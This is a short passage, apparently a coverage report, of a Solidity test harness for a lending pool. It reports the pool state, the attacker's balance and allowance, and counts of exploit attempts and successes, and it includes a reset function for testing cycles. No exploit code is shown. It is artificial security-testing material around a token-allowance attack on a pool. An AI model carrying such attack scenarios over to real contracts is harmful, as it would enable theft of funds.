 186 | *   |         uint256 attackerBalance,
 187 | *   |         uint256 allowance,
 188 | *   |         uint256 attempts,
 189 | *   |         uint256 successes,
 190 | *   |         uint256 poolLoans,
 191 | *   |         uint256 poolRepayments
 192 |     |     ) {
 193 | *   |         (uint256 balance, uint256 loans, uint256 repayments) = pool.getPoolState();
 194 |     |         
 195 | *   |         return (
 196 | *   |             balance,
 197 | *   |             token.balanceOf(attacker),
 198 | *   |             token.allowance(address(pool), attacker),
 199 | *   |             exploitAttempts,
 200 | *   |             successfulExploits,
 201 | *   |             loans,
 202 | *   |             repayments
 203 |     |         );
 204 |     |     }
 205 |     |     
 206 |     |     /**
 207 |     |      * @dev Reset function for fresh testing cycles
 208 |     |      */
 209 | *   |     function reset() public {
 210 | *   |         exploitAttempts = 0;
 211 | *   |         successfulExploits = 0;
 212 |     |     }
 213 |     | }
 214 |     | 

